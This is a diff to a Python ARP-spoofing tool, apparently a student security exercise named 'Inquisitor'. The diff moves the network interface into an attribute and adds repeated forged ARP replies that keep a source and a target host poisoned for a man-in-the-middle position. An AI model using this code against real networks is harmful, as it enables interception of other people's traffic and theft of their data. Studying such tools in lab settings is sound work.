@@ -26,6 +26,7 @@ class Inquisitor:
         self.source = Machine(source_mac, source_ip, "Source")
         self.target = Machine(target_mac, target_ip, "Target")
 
+        self.interface = "enp0s3"
         self.ouput_file = get_output_file_name()
         self.threading()
 
@@ -40,17 +41,16 @@ class Inquisitor:
     #! MAN IN THE MIDDLE
 
     def arp_listener(self):
-        interface = "enp0s3"
         count = 0
         priting_machines(self, count)
 
         try:
-            cap = pcapy.open_live(interface, 65535, True, 100)
+            cap = pcapy.open_live(self.interface, 65535, True, 100)
             cap.setfilter("arp")
             while True:
                 header, packet = cap.next()
                 if header is not None and packet is not None:
-                   sender_mac, sender_ip, target_mac, target_ip = process_packet(header, packet, self)
+                   sender_mac, sender_ip, target_mac, target_ip = process_request_packet(header, packet, self)
                 
                 count += 1
                     
@@ -68,7 +68,7 @@ class Inquisitor:
         except pcapy.PcapError as e:
             log_error(f"Pcapy error during capture: {e}")
             log_error("Make sure to run the script with root privileges (sudo).")
-            log_error(f"Check that the interface '{interface}' exists and is operational.")
+            log_error(f"Check that the interface '{self.interface}' exists and is operational.")
         except Exception as e:
             log_error(f"An unexpected error occurred in the looking_for_arp_requests function: {e}")
         pass
@@ -79,14 +79,14 @@ class Inquisitor:
             if self.source.poisoned and self.target.poisoned:
                 if switch == False:
                     log_success("Both source and target have been successfully spoofed.")
+                    log_info("maintaining arp connection for source and target")
                     switch = True
-                log_debug("maintaining arp connection for source and target")
             if self.source.poisoned:
+                send_arp_reply(self.interface, self.attacker.mac_address, self.target.ip_address, self.source.mac_address, self.source.ip_address)
                 pass
-                # log_success("REPLY SEND TO SOURCE")
             if self.target.poisoned:
+                send_arp_reply(self.interface, self.attacker.mac_address, self.source.ip_address, self.target.mac_address, self.target.ip_address)
                 pass
-                # log_success("REPLY SEND TO TARGET")
             threading_end_event.wait(5)
 
 
